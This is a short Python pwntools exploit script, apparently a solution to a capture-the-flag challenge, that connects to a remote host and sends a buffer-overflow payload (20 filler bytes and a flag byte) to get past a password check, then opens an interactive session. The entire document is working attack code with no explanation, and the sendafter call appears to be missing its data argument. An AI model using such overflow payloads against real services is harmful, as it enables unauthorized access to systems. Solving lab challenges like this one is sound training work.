from pwn import *

r = remote("boofy.tghack.no", 6003)

payload = b''
payload += b'a' * 0x14
payload += b'\x01'

r.sendafter('password?\n')
r.sendline(payload)
r.interactive()
